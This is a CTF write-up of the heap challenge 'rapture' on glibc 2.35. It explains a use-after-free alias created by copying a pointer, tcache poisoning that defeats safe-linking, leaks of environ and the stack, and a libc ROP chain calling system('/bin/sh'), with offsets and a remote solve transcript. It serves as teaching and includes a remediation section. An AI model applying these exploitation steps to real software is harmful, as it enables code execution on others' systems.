# rapture

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Binary Exploitation |
| Author | Abhi404 |
| Points | 144 |
| Solves at time of solving | 68 |
| Flag | `zdk{FreeD_ln_tHE_DeeP_But_N3v3R_FORg0t7en}` |

> Rapture Deep Station is holding at 2000 fathoms. Take the station's master
> key with you.

## Executive Summary

`rapture` is a menu-driven heap challenge built against the supplied Ubuntu
glibc 2.35. It stores up to 64 heap allocations in a global manifest. Every
entry has one read ticket and one write ticket, which initially makes the
interface look restrictive.

The vulnerability is the "redundancy snapshot" operation. It copies all 32
bytes of a manifest entry, including its heap pointer, size, occupancy flag,
and both tickets, into another slot. The allocation itself is not duplicated.
Freeing either entry therefore leaves the other as a readable and writable
dangling alias.

The exploit turns that alias into three progressively stronger primitives:

1. Fill the largest tcache bin and place two separated chunks in the unsorted
   bin. Reading the second chunk leaks both a full heap pointer and a
   `main_arena` pointer, defeating heap and libc ASLR.
2. For any fresh tcache size class, free an aliased seed into an empty bin and
   read its encoded `next` value. Because the real next pointer is null, this
   value is exactly `seed_address >> 12`, the glibc safe-linking key. Rebuild a
   two-entry bin, overwrite the seed's encoded next pointer, and obtain an
   allocation at an arbitrary aligned address.
3. Allocate first at libc's `environ` to leak the stack, then across a stack
   window to locate the saved return address dynamically. Finally, poison a
   small tcache bin directly to `saved_return - 8` and write a libc ROP chain
   above the canary.

The exploit never needs the PIE base and never modifies the stack canary. It
uses only offsets from the exact libc included in the handout. The supplied
[solver](solve.py) implements the complete attack with Python's standard
library and communicates with the challenge's TLS endpoint directly.

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/pwn_rapture.tar.gz`](challenge/pwn_rapture.tar.gz) | Original challenge handout | `6665a5ca1ff1d907810b4a8abbe06d4fc2b9ce19505fa748dfcacef40bcf3c6c` |
| [`challenge/rapture`](challenge/rapture) | Challenge executable | `00e41dafde7db55cfe2443eca7cecadc2975d042bbf7df469627ee4f56ae1929` |
| [`challenge/libc.so.6`](challenge/libc.so.6) | Supplied Ubuntu glibc 2.35 | `c53819710b163d3f1d2541778590d58d3ef31cb0ed75adcbe059faac68c1e72d` |
| [`challenge/ld-linux-x86-64.so.2`](challenge/ld-linux-x86-64.so.2) | Supplied dynamic loader | `9eb34cb2da3ae2a9398cc09b3cd2d069563ec40d9858cb711af15cd23fa80abf` |
| [`solve.py`](solve.py) | Dependency-free end-to-end remote exploit | `38411ffd6159e201fdb0db6249efe8ec1f94e340fdcc017260dd7eb3cda735f3` |
| [`artifacts/offsets.txt`](artifacts/offsets.txt) | Relevant binary, libc, gadget, and size-class offsets | `60c376043fd173b2ec41a11524d9373574851d89c14542b9edd3d7106a6770f4` |
| [`artifacts/remote-run.txt`](artifacts/remote-run.txt) | Successful remote exploit transcript | `e2f3a6537674083aa562b793346f67de59a4e559fbc8e168d90f44267cc5c1f1` |

## 1. Initial Triage

The archive contains the executable and its exact runtime:

```console
$ tar -tzvf pwn_rapture.tar.gz
-rwxrwxrwx ... pwn_rapture/ld-linux-x86-64.so.2
-rwxrwxrwx ... pwn_rapture/libc.so.6
-rwxrwxrwx ... pwn_rapture/rapture
```

The executable is small, dynamically linked, and not stripped:

```console
$ file rapture
rapture: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
         interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

`rabin2 -I rapture` reports the following hardening:

| Mitigation | State | Consequence |
| --- | --- | --- |
| Full RELRO | Enabled | GOT overwrite is unavailable |
| Stack canary | Enabled | A direct stack overflow must preserve the canary |
| NX | Enabled | Injected heap or stack data cannot execute directly |
| PIE | Enabled | Challenge code addresses are randomized |
| Symbols | Present | `main`, `read_long`, `die`, and `manifest` are named |

The supplied libc identifies itself as:

```text
GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.13) stable release version 2.35.
```

The binary imports only a narrow set of functions: `malloc`, `free`, `read`,
`write`, `strlen`, `setvbuf`, `_exit`, and the usual runtime helpers. There is
no hidden win function and no direct command execution path. The intended
route is heap exploitation followed by a libc control-flow target.

## 2. Understanding the Menu

The service exposes six operations:

```text
[1] Requisition ballast cell
[2] Recalibrate cell payload
[3] Jettison cell
[4] Inspect cell
[5] Commit redundancy snapshot
[6] Surface (exit)
```

The global `manifest` symbol is at PIE offset `0x4060` and occupies 2048 bytes.
The menu accepts indices from 0 through 63, so each entry is:

```text
2048 / 64 = 32 = 0x20 bytes
```

Following the loads and stores in `main` reconstructs this layout:

```c
struct cell {
    void    *data;          // +0x00
    uint64_t size;          // +0x08
    uint32_t occupied;      // +0x10
    uint32_t read_ticket;   // +0x14
    uint32_t write_ticket;  // +0x18
    uint32_t padding;       // +0x1c
};

struct cell manifest[64];
```

### 2.1 Requisition: allocate once

The handler begins at `main+0x398` (`0x14d8`). It rejects occupied slots and
accepts allocation sizes from 1 through `0x408` inclusive:

```text
0x1537  lea rax, [requested_size - 1]
0x153b  cmp rax, 0x407
0x1547  mov rdi, requested_size
0x154a  call malloc
```

After a successful allocation it stores the pointer, size, and occupancy flag.
The qword loaded from `0x22e8` initializes both tickets to 1:

```c
cell->data = malloc(size);
cell->size = size;
cell->occupied = 1;
cell->read_ticket = 1;
cell->write_ticket = 1;
```

The requisition operation does not initialize the chunk's contents.

### 2.2 Recalibrate: one exact-size write

The handler at `0x1400` requires an occupied cell and a nonzero write ticket.
It then loops on `read(0, cell->data, remaining)` until exactly `cell->size`
bytes have been consumed. Finally it clears `write_ticket` at `0x14c4`.

This gives one exact-size write to every ordinary allocation. More
importantly, if the pointer is dangling, it gives one exact-size UAF write.

### 2.3 Jettison: free and clear one entry

The handler at `0x1370` calls `free(cell->data)` and clears the pointer, size,
occupancy flag, and both tickets in that one manifest entry:

```c
free(cell->data);
memset(cell, 0, sizeof(*cell));
```

It has no global ownership tracking. If another manifest entry refers to the
same allocation, that alias is neither found nor cleared.

### 2.4 Inspect: one exact-size read

The handler at `0x12f0` checks `occupied` and `read_ticket`, then performs:

```c
write(1, cell->data, cell->size);
cell->read_ticket = 0;
```

Because the output is not string-based, embedded null bytes do not truncate a
leak. A dangling snapshot therefore exposes allocator metadata across the
entire former user area.

### 2.5 Snapshot: duplicate ownership and tickets

The handler at `0x1238` requires an occupied source and empty destination. At
`0x12bd` and `0x12d8`, two 16-byte moves copy the complete 32-byte entry:

```c
manifest[backup] = manifest[source];
```

No new heap allocation is made. Both entries now hold the same pointer and
size, and each independently claims to be occupied with valid read and write
tickets.

## 3. Root Cause: A Ticketed UAF Alias

The snapshot operation confuses metadata redundancy with object duplication.
Consider this sequence:

```text
create(0, size)       cell 0 -> chunk A, read=1, write=1
snapshot(0, 1)       cell 1 -> chunk A, read=1, write=1
free(0)              chunk A freed; cell 0 cleared
                      cell 1 still points to freed chunk A
```

Cell 1 retains both capabilities:

- `inspect(1)` reads freed chunk A after glibc writes freelist metadata into it.
- `edit(1, data)` overwrites freed chunk A, including its freelist pointer.

The one-use tickets do not meaningfully constrain exploitation because the
snapshot duplicates them before the free. Each size class only needs one leak
and one metadata overwrite.

This also creates a potential double-free primitive, but glibc 2.35 checks the
tcache key and uses safe-linking. A controlled UAF read/write is cleaner and
more deterministic than trying to bypass the double-free checks directly.

## 4. Stage One: Heap and Libc Leaks

The largest accepted request is `0x408`. On 64-bit glibc, it normalizes to a
`0x410` chunk, which is the largest default tcache size class. Each tcache bin
holds at most seven chunks.

### 4.1 Allocation layout

The solver creates this physical layout:

```text
index 0..7   eight chunks requested at 0x408  (chunk size 0x410)
index 8      guard requested at 0x18
index 9      ninth chunk requested at 0x408   (chunk size 0x410)
index 10     second guard requested at 0x18
```

The guards prevent the two selected large chunks from coalescing with each
other or with the top chunk. Before freeing, the solver snapshots:

```text
snapshot(7, 12)
snapshot(9, 13)
```

Cells 12 and 13 will survive as dangling readers.

### 4.2 Fill tcache, then use unsorted

Freeing cells 0 through 6 fills the `0x410` tcache bin:

```text
tcache[0x410] count = 7
head -> chunk 6 -> chunk 5 -> ... -> chunk 0
```

The next two frees cannot enter that full tcache bin:

```text
free(7)  -> unsorted chunk A
free(9)  -> unsorted chunk B
```

Because A and B are separated by the guard at index 8, they remain distinct.
The newest unsorted chunk B receives:

```text
B->fd = A
B->bk = unsorted_bin_head
```

Inspecting dangling cell 13 returns B's user area, whose first two qwords are
therefore:

```text
qword 0: full pointer to unsorted chunk A  -> heap leak
qword 1: main_arena + 0x60                -> libc leak
```

For the supplied libc, that arena pointer is at offset `0x21ace0`:

```python
libc_base = arena_pointer - 0x21ACE0
assert libc_base & 0xFFF == 0
```

A successful run produced:

```text
unsorted heap pointer:  0x55556d4d4f00
unsorted arena pointer: 0x7f0010b22ce0
libc base:              0x7f0010908000
```

The page-alignment assertion catches an incorrect arena offset immediately.

## 5. Stage Two: Safe-Linking-Aware Arbitrary Allocation

glibc 2.35 protects each singly linked tcache pointer with safe-linking. For a
freed chunk at address `position`, its stored next pointer is:

```c
stored_next = real_next ^ (position >> 12);
```

An ordinary tcache-poison exploit therefore needs the heap-derived XOR key.
The dangling read ticket exposes it directly.

### 5.1 Leak a size-class-specific key

Start with an empty tcache bin and a seed chunk A:

```text
create(seed, size)
snapshot(seed, alias)
free(seed)
```

Because the bin was empty, `real_next` is null:

```text
A->next = 0 ^ (A >> 12) = A >> 12
```

`inspect(alias)` reads that qword exactly. This value is the safe-linking key
needed to encode a replacement next pointer for A.

### 5.2 Rebuild a two-entry bin

One subtlety is tcache's independent count. If the bin contains only A,
allocating A decrements the count to zero; glibc then ignores even a poisoned
head on the following allocation. The exploit must make A the head while the
count is two.

The solver does this without double-freeing:

```text
create(recycled, size)   reclaim A; tcache count = 0
create(spacer, size)     allocate B
free(spacer)             head = B; count = 1
free(recycled)           head = A -> B; count = 2
```

The original snapshot alias still points to A and still has its write ticket.

### 5.3 Poison and allocate

For an aligned target address T, write:

```python
encoded_target = T ^ (A >> 12)
edit(alias, p64(encoded_target) + zero_padding)
```

The next allocations behave as follows:

```text
malloc #1 -> A       tcache head becomes T; count becomes 1
malloc #2 -> T       arbitrary allocation; count becomes 0
```

This primitive is implemented once in `poison_allocate()` and reused with
fresh size classes. Using separate bins avoids interacting with a poisoned
head left behind after glibc returns an allocation at a non-heap address.

## 6. Stage Three: Leak `environ`

The supplied libc exports `environ` at offset `0x222200`. Its first qword is a
pointer to the process's environment array on the stack.

The solver uses request size `0x3d8`, which normalizes to chunk size `0x3e0`,
and poisons that tcache bin to:

```python
environ_address = libc_base + 0x222200
```

The resulting manifest entry points into libc rather than the heap. Inspecting
it calls `write(1, environ_address, 0x3d8)`, and the first qword yields the live
stack address.

### Why not request `0x3f8`?

This size choice matters. A `0x3f8` request normalizes to `0x400`. At this
point two `0x410` unsorted chunks exist. Splitting one would leave only `0x10`
bytes, less than glibc's minimum chunk size, so malloc may return the complete
`0x410` chunk. Freeing it then places it back in the already full `0x410`
tcache class and destroys the intended independent-bin state.

A `0x3d8` request normalizes to `0x3e0`, leaving a valid `0x30` remainder when
served from a `0x410` unsorted chunk. The returned chunk therefore belongs to
the expected `0x3e0` bin.

The remote run leaked:

```text
0x3e0-bin safe-link key: 0x55556d4d5
environ stack pointer:  0x7ffc8de325f0
```

## 7. Stage Four: Find `main`'s Saved Return Address

A fixed offset from `environ` to `main`'s frame would depend on the launcher's
argument and environment layout. The exploit instead reads a broad stack
window and searches for a known return-site value.

Using request size `0x3b8` (chunk size `0x3c0`), a fresh tcache bin is poisoned
to:

```python
stack_target = align_down(stack_environ - 0x400, 16)
```

Inspecting this allocation returns 0x3b8 bytes spanning from roughly
`environ - 0x400` to `environ - 0x48`. That range includes `main`'s frame and
the libc startup frame.

### Identify the return site by value

In the supplied libc, startup code calls `main` at `0x29d8e`:

```text
0x29d89  mov rax, [rsp + 8]   ; main
0x29d8e  call rax
0x29d90  mov edi, eax         ; execution resumes here
```

Consequently, the qword saved as `main`'s return address is:

```python
expected_return = libc_base + 0x29D90
```

The solver searches the leaked stack bytes for that full ASLR-adjusted value:

```python
return_offset = stack_data.find(p64(expected_return))
saved_return_address = stack_target + return_offset
```

This is stronger than hard-coding an `environ` delta: the stack position may
move, but the return value remains identifiable after the libc leak.

In the recorded run:

```text
leaked stack window: 0x7ffc8de321f0-0x7ffc8de325a8
main saved return:   0x7ffc8de324d8
```

## 8. Stage Five: A Narrow Stack Write

The broad stack allocation still has a write ticket, but writing through it is
unsafe. Its buffer begins hundreds of bytes below `main`'s current stack
pointer. The `read()` used by the recalibrate action needs its own active call
frames in that lower region. Writing all 0x3b8 bytes there overwrites those
frames while `read` is executing, so the process crashes before returning to
the menu.

The reliable design separates disclosure from control:

1. Keep the `0x3c0` stack allocation read-only.
2. Create a fresh `0x90` tcache bin with request size `0x88`.
3. Poison it directly to `saved_return_address - 8`.
4. Use the resulting 136-byte allocation only for the final control write.

`saved_return_address - 8` is 16-byte aligned and corresponds to `main`'s saved
`r15` slot. The final write therefore begins above the local stack frame:

```text
lower addresses

main locals
stack canary              untouched
saved rbx                 untouched
saved rbp                 untouched
saved r12                 untouched
saved r13                 untouched
saved r14                 untouched
saved r15       <--------- allocation starts here
saved return    <--------- ROP chain starts here

higher addresses
```

This avoids both hazards:

- The write no longer overlaps the active `read()` call frames below `main`.
- The canary remains intact, so option 6 passes the epilogue check normally.

glibc's poisoned `malloc` clears the tcache key at target+8, temporarily
zeroing the saved return address. That is harmless because `main` does not
return before the exploit immediately spends the new entry's write ticket and
installs the ROP chain.

## 9. Stage Six: Libc ROP

All control-flow components come from the supplied libc, so no PIE leak is
needed:

| Component | Libc offset |
| --- | ---: |
| `pop rdi; ret` | `0x2a3e5` |
| plain `ret` | `0x2a3e6` |
| `system` | `0x50d70` |
| `/bin/sh` | `0x1d8678` |
| `exit` | `0x455f0` |

The final 0x88-byte payload is:

```text
+0x00  0                              dummy saved r15
+0x08  libc + 0x2a3e6                 ret for stack alignment
+0x10  libc + 0x2a3e5                 pop rdi; ret
+0x18  libc + 0x1d8678                 "/bin/sh"
+0x20  libc + 0x50d70                 system
+0x28  libc + 0x455f0                 exit after the shell closes
+0x30  zero padding to 0x88 bytes
```

The leading plain `ret` makes `rsp % 16 == 8` on entry to `system`, matching
the System V AMD64 ABI. Without it, libc code using aligned stack operations
can fault.

After spending the write ticket, the solver chooses option 6. `main` verifies
its untouched canary, restores its saved registers, and returns through the
chain. The spawned `/bin/sh` inherits the TLS-connected standard streams. The
solver sends:

```sh
cat /flag* 2>/dev/null; exit
```

## 10. End-to-End Exploit Flow

The complete allocator progression is:

```text
1.  Allocate 0x410 chunks and guards.
2.  Snapshot chunks 7 and 9.
3.  Fill 0x410 tcache with seven frees.
4.  Free chunks 7 and 9 into unsorted.
5.  Inspect alias 13 -> heap pointer and arena pointer.
6.  Calculate libc base from arena offset 0x21ace0.

7.  Build 0x3e0 tcache poison.
8.  Allocate at libc environ.
9.  Inspect -> stack environment pointer.

10. Build 0x3c0 tcache poison.
11. Allocate at align_down(environ - 0x400, 16).
12. Inspect -> broad stack window.
13. Search for libc + 0x29d90 -> saved return address.

14. Build 0x90 tcache poison.
15. Allocate at saved_return - 8.
16. Write aligned system("/bin/sh") ROP chain.
17. Choose Surface and read the flag through the shell.
```

The solver uses only 22 of the 64 manifest slots and one write plus one read
per dangling alias, staying within every nominal menu restriction.

## 11. Reproducing the Solve

No third-party Python package is required. Run the solver directly from this
directory:

```console
$ python3 solve.py
[+] unsorted heap pointer:  0x55556d4d4f00
[+] unsorted arena pointer: 0x7f0010b22ce0
[+] libc base:              0x7f0010908000
[+] 0x3e0-bin safe-link key: 0x55556d4d5
[+] environ stack pointer:  0x7ffc8de325f0
[+] 0x3c0-bin safe-link key: 0x55556d4d5
[+] leaked stack window:    0x7ffc8de321f0-0x7ffc8de325a8
[+] main saved return:      0x7ffc8de324d8
[+] 0x90-bin safe-link key:  0x55556d4d5
Blowing ballast... surfacing.
zdk{FreeD_ln_tHE_DeeP_But_N3v3R_FORg0t7en}
[+] flag: zdk{FreeD_ln_tHE_DeeP_But_N3v3R_FORg0t7en}
```

ASLR changes every displayed address. The solver derives all of them during
the same connection and validates that the calculated libc base is page
aligned. Use `--verbose` to print every pointer-like qword in the leaked stack
window while auditing the return-address search.

The instance can occasionally take longer than ten seconds while processing a
sequence of menu operations, so the solver uses a 30-second socket timeout by
default. This affects only transport patience, not heap timing.

## 12. Remediation

The primary fix is to give each heap allocation exactly one owner. A snapshot
should either:

- Deep-copy the payload into a new allocation and initialize independent
  metadata, or
- Store a reference-counted object and decrement/free it only when the final
  reference disappears.

Copying the raw pointer and independent ownership flags must not be allowed.
The program should also invalidate all aliases when an object is freed and
avoid storing security capabilities such as read/write tickets inside a
structure that can be duplicated wholesale.

Defensive allocator mitigations did raise the exploit cost: safe-linking
required a heap-derived key, full RELRO removed the simplest writable function
pointer, PIE randomized challenge code, and the canary blocked a naive stack
overwrite. None of them can restore ownership invariants once the application
provides authenticated UAF reads and writes. Correct object lifetime management
is the decisive fix.

## Flag

```text
zdk{FreeD_ln_tHE_DeeP_But_N3v3R_FORg0t7en}
```
